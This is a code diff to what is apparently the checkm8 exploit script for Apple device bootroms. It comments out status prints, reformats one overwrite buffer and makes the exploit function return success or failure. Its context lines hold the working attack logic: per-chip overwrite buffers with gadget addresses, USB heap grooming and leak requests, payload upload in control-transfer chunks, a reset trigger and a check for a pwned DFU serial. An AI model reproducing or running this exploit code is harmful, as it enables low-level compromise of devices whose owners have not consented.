@@ -412,7 +412,8 @@ def all_exploit_configs():
     s5l895xx_overwrite = b'\0' * 0x640 + struct.pack('<20xI4x', 0x10000000)
     t800x_overwrite = b'\0' * 0x5C0 + struct.pack('<20xI4x', 0x48818000)
     s5l8960x_overwrite = b'\0' * 0x580 + struct.pack('<32xQ8x', 0x180380000)
-    t8010_overwrite    = b'\0' * 0x580 + struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
+    t8010_overwrite = b'\0' * 0x580 + struct.pack('<32x2Q16x32x2QI', t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget,
+                                                  0x1800B0800, 0xbeefbeef)
     t8011_overwrite = b'\0' * 0x500 + struct.pack('<32x2Q16x32x2QI', t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget,
                                                   0x1800B0800, 0xbeefbeef)
     t8015_overwrite = b'\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget,
@@ -449,16 +450,16 @@ def exploit_config(serial_number):
 
 
 def exploit():
-    print('*** checkm8 exploit by axi0mX ***')
+    # print('*** checkm8 exploit by axi0mX ***')
 
-    print("****** stage 1, heap grooming")
+    # print("****** stage 1, heap grooming")
     device = DFUDevice()
     serial_number = device.device.serial_number
     start = time.time()
 
-    print('Found:', serial_number)
+    # print('Found:', serial_number)
     if 'PWND:[' in serial_number:
-        print('Device is already in pwned DFU Mode. Not executing exploit.')
+        # print('Device is already in pwned DFU Mode. Not executing exploit.')
         return
 
     payload, config = exploit_config(serial_number)
@@ -469,7 +470,7 @@ def exploit():
             device.usb_req_leak()
         device.usb_req_no_leak()
     else:
-        print("no large leak, hole:%d" % config.hole)
+        # print("no large leak, hole:%d" % config.hole)
         device.stall()
         for i in range(config.hole):
             device.no_leak()
@@ -479,7 +480,7 @@ def exploit():
     device.usb_reset()
     device.release()
 
-    print("****** stage 2, usb setup, send 0x800 of 'A', sends no data")
+    # print("****** stage 2, usb setup, send 0x800 of 'A', sends no data")
     device.reacquire()
 
     device.libusb1_async_ctrl_transfer(0x21, 1, 0, 0, b'A' * 0x800, 0.0001)
@@ -489,14 +490,14 @@ def exploit():
 
     time.sleep(0.5)
 
-    print("****** stage 3, exploit")
+    # print("****** stage 3, exploit")
     device.reacquire()
 
     device.usb_req_stall()
     if config.large_leak is not None:
         device.usb_req_leak()
     else:
-        print("doing leak %d" % config.leak)
+        # print("doing leak %d" % config.leak)
         for i in range(config.leak):
             device.usb_req_leak()
 
@@ -508,20 +509,19 @@ def exploit():
     for i in range(0, len(payload), 0x800):
         device.libusb1_no_error_ctrl_transfer(0x21, 1, 0, 0, payload[i:i + 0x800], 50)
 
-    print("trigger")
+    # print("trigger")
     device.usb_reset()
     device.release()
 
-    print("****** final check")
+    # print("****** final check")
     device.reacquire()
     serial_number = device.device.serial_number
 
-    print("final serial: ", serial_number)
+    # print("final serial: ", serial_number)
     if 'PWND:[checkm8]' not in serial_number:
-        print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
+        device.release()
+        return False
         # sys.exit(1)
     else:
-        print('Device is now in pwned DFU Mode.')
-        print('(%0.2f seconds)' % (time.time() - start))
-
-    device.release()
+        device.release()
+        return True
